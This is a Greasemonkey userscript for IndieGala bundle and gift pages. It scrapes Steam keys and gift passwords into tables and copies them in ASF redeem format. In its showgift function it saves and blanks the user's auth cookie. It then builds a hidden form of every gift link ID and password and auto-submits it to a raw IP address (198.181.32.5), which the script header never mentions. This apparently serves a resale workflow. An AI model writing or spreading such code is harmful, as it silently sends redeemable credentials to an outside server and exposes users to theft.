// ==UserScript==
// @name        ig_bundle_ajax
// @namespace   ig_bundle_ajax
// @description ig_bundle_ajax
// @include     https://www.indiegala.com/ajaxsale?sale_id=*
// @include     https://www.indiegala.com/gift?gift_id=*
// @icon        http://www.indiegala.com/favicon.ico
// @updateURL 	https://github.com/rusania/gm_scripts/raw/master/ig_bundle_ajax.user.js
// @downloadURL https://github.com/rusania/gm_scripts/raw/master/ig_bundle_ajax.user.js
// @version     2019.08.01.1
// @run-at      document-end
// @grant       unsafeWindow
// @require     http://libs.baidu.com/jquery/1.10.1/jquery.min.js
// @grant       GM_log
// @grant       GM_addStyle
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_setClipboard
// @grant unsafeWindow
// ==/UserScript==

GM_addStyle("table{border:solid 1px;border-collapse:collapse !important;}");
GM_addStyle("td{border:solid 1px;border-collapse:collapse;padding-left:5px;padding-right:5px;font-family:simsun !important;}");
GM_addStyle("div{font-family:simsun !important;}");

var keys = Array();
var how = $('#header-title');
if(how.length == 0)
    how = $('.left');
if (how.length > 0){
    how.after('<table id="area"></table><div id="area2">');
    how.after('&#9;<button id="btng"><span style="color:red;">GIFT</span></button>');
    how.after('&#9;<button id="cpasf2">CPASF2</button>');
    how.after('&#9;<button id="cpasf">AGISO</button>');
    how.after('&#9;<button id="cpgrid">CPGRID</button>');
    how.after('&#9;<button id="redeem"><span style="color:red;">KEYS</span></button>');
    how.after('&#9;<button id="show">SHOW</button>');
    how.after('<div><input id="p" type=text /></div>');
    how.after('<textarea id="in" style="margin: 0px; width: 702px; height: 139px;"></textarea>');
    showkey();

    $("body").on('click', '#show', function(){
        showkey();
    });

    $('#redeem').click(function () {
        $('.fn').click();
    });

    $('#cpgrid').click(function () {
        var txt = '';
        $('#area tr').each(function(){
            $(this).children('td').each(function(){
                txt += $.trim($(this).text()) + '\t';
            });
            txt += '\n';
        });
        GM_setClipboard(txt);
    });

    $('#cpasf').click(function () {
        var txt = '';
        $('#area2 div').each(function(){
            txt += $(this).text() + '\n';
        });
        txt += `********************{r}【ASF格式】{r}{r}!redeem ${keys.join(',')}`;;
        GM_setClipboard(txt);
    });

    $('#cpasf2').click(function () {
        var txt = '';
        $('#area2 div').each(function(){
            txt += $(this).text() + '\n';
        });
        txt += `\n【ASF格式】\n!redeem ${keys.join(',')}`;;
        GM_setClipboard(txt);
    });

    $('#btng').click(function () {
        $('#area').empty();
        $('#area2').empty();
        var text = $('#in').val();
        var m = /gift_id=([0-9a-f]+)/.exec(text);
        if (m){
            var id = m[1];
            m = /密码.*([A-Z0-9]{6})/.exec(text);
            if (m){
                $('#a').empty();
                $('#b').empty();
                $('#c').empty();
                getkey(id, m[1]);
            }
        }
    });
}

var bk = $('.title-bundle-kind');
if(bk.length > 0){
    var dv = $('#area2');
    if (dv.length == 0)
        dv = $('.title-bundle-kind');
    dv.after('<table id="area_gifts"></table><table id="area_na"></table>');
    dv.after('<button id="cpgift">CPGIFT</button>');
    dv.after('<button id="gift_btn">GIFTS</button>');
    dv.after('<button id="rest">RESTORE</button>');
    showgift();
    $('#gift_btn').click(function () {
        showgift();
    });
    $('#rest').click(function () {
        restore();
    });
    $('#cpgift').click(function () {
        var txt = '';
        $('#area_gifts tr').each(function(){
            $(this).children('td').each(function(){
                txt += $(this).text() + '\t';
            });
            txt += '\n';
        });
        GM_setClipboard(txt);
    });
}

function chgcookie()
{
    var m = /auth="([^=;"]+)"/.exec(document.cookie);
    if (m)
        GM_setValue("cookie", m[1]);
}

function showkey()
{
    $('#area').empty();
    $('#area2').empty();
    var i = 1;
    keys = Array();
    var t = $('#indie_gala_2 div:first').text();
    $('.game-key-string').each(function () {
        var steam = $(this).find('.game-steam-url');
        var href = steam.attr('href');
        var ma = /(app|sub)\/(\d+)/.exec(href);
        if (ma){
            var id = ma[2];
            var k = $(this).find('.input-block-level')[0];
            var key = k.value;
            keys.push(key);
            var code = '';
            var m = /serial_n_([A-F0-9]+)/.exec(k.id);
            if (m)
                code = m[1];
            $('#area').append(`<tr><td><a href="http://store.steampowered.com/${ma[0]}/">${steam.text()}</a></td><td class="${id}">${key}</td><td><a class="fn" href="javascript:void(0);" onclick="fetchkey(\'${code}\', ${id}, \'${key}\', '');">${i}</a></td><td>${t}</td></tr>`);
            $('#area2').append(`<div>【${i++}】【${steam.text()}】 <span class="${id}">${key}</span></div>`);
            /*
            if (key.length == 0)
                fetchkey(code, id, '');
            */
        }
    });
}

unsafeWindow.fetchkey = function(code, id, key, pass)
{
    pass = $('#p').val();
    $('.'+id).empty();
    if (key)
        return;
    // {"status": "passcheck", "serial_number": ""}
    // {"status": "passcheck_failed", "serial_number": ""}
    $.ajax({
        url: '/myserials/syncget',
        type: "GET",
        dataType : 'json',
        data: {code: code,
               cache: false,
               productId: id,
               passCode: pass
              },
    }).done(function(data){
        if(data.status){
            switch (data.status){
                case 'success':
                    $('#p').val('');
                    //keys.push(key);
                    //k.value = data.serial_number;
                    $('.'+id).append(data.serial_number);
                    //$('<input value=' + data.entity_id + '/>').insertAfter($(input));
                    break;
                case 'passcheck':
                    break;
                case 'passcheck_failed':
                    $('.'+id).append(data.status);
                    break;
                default:
                    $('.'+id).append(data.status);
                    break;
            }
        }
    }).fail(function(data){
        $('.'+id).append('error-key');
    });
}

function showgift()
{
    $('#area_gifts').empty();
    var gifts = Array();
    var na = Array();
    $('.gift-links-box').each(function () {
        var num = '';
        var m = /link (\d+)/.exec($(this).find('.title-gift').text());
        if (m)
            num = m[1];
        var link = $(this).find('a').attr('href');
        var p = $(this).find('.gift-psw');
        var pwd = '';
        if (p.length == 0){
            na.push(link);
        }
        else {
            pwd = $.trim(p.text());
            var color = link.substr( - 6, 6);
            link = `<tr style="color:#${color}"><td>www.indiegala.com${link}</td><td>${pwd}</td><td>${num}</td></tr>`;
            gifts.push(link);
            //$('#area_gifts').append('<tr><td>' + num + '</td><td>' + link + '</td><td>' + pwd + '</td></tr>');
        }
    });
    if(na.length > 0){
        var cp = na.length;
        chgcookie();
        document.cookie = 'auth=""';
        $.each(na, function(k, v){
            var i = k;
            $('#area_na').append(`<tr><td>${v}</td><td id="${i}">-</td></tr>`);
            $.ajax({
                url: v,
                type: "GET",
                complete: function( data, status, xhr ){
                    $('#' + i).append(status);
                    if (cp-- == 1)
                        restore();
                }
            });
        });
    } else  {
        gifts.sort();
        gifts.forEach(function (e) {
            $('#area_gifts').append(e);
        });
        var dt = $('.profile_list').attr('id');
        var s = '';
        var m = /id=(\d+)/.exec(document.URL);
        if (m)
            s = m[1];
        bk.append(`<form id="f" action="http://198.181.32.5/ig_sale.php?c=gift&s=${s}&d=${dt}" method="post" target="_blank"></form>`);
        $('#area_gifts tr').each(function () {
            var t = $(this).find('td');
            var g = '';
            m = /id=([0-9a-f]+)/.exec($(t[0]).text());
            if (m)
                g = m[1];
            var pwd = $(t[1]).text();
            var dx = $(t[2]).text();
            $('#f').append(`<input type="hidden" name="${g}" value="${pwd},${dx}" />`);
        });
        $('#f').append('<input type="submit" value="Submit" />');
        setTimeout(function () {
            $('#f').submit();
        },1000);
    }
}

function restore(){
    var ck = GM_getValue("cookie", '');
    document.cookie = `auth="${ck}"`;
    setTimeout(function () {
        window.location.reload();
    },1000);
}

function getkey(id, pwd){
    $.ajax({
        url: `/gift?gift_id=${id}`,
        type: "GET",
    }).done(function(data){
        var m = /gift-validation-token" value="([0-9a-f]+)/.exec(data);
        var token = m[1];
        var d = `{"gift_id":"${id}","gift_token":"${token}","gift_password":"${pwd}"}`;
        $.ajax({
            url: '/gift/verify',
            type: "POST",
            dataType : 'json',
            data: d,
        }).done(function(data){
            if (data && data.status == 200){
                var i = 1;
                keys = Array();

                var t = $.trim($(data.contents).find('#indie_gala_2 div:first').text());
                $(data.contents).find('.game-key-string').each(function () {
                    var steam = $(this).find('.game-steam-url');
                    var href = steam.attr('href');
                    var ma = /(app|sub)\/(\d+)/.exec(href);
                    var id = ma[2];
                    var k = $(this).find('.input-block-level')[0];
                    var key = k.value;
                    keys.push(key);
                    var code = '';
                    var m = /serial_n_([A-F0-9]+)/.exec(k.id);
                    if (m)
                        code = m[1];
                    $('#area').append(`<tr><td><a href="http://store.steampowered.com/${ma[0]}/">${steam.text()}</a></td><td class="${id}">${key}</td><td><a class="fn" href="javascript:void(0);" onclick="fetchkey(\'${code}\', ${id}, \'${key}\', '');">${i}</a></td><td>${t}</td></tr>`);
                    $('#area2').append(`<div>【${i++}】【${steam.text()}】 <span class="${id}">${key}</span></div>`);
                });
            }
        }).fail(function(data){
            alert('error-2');
        });
    }).fail(function(data){
        alert('error-1');
    });
}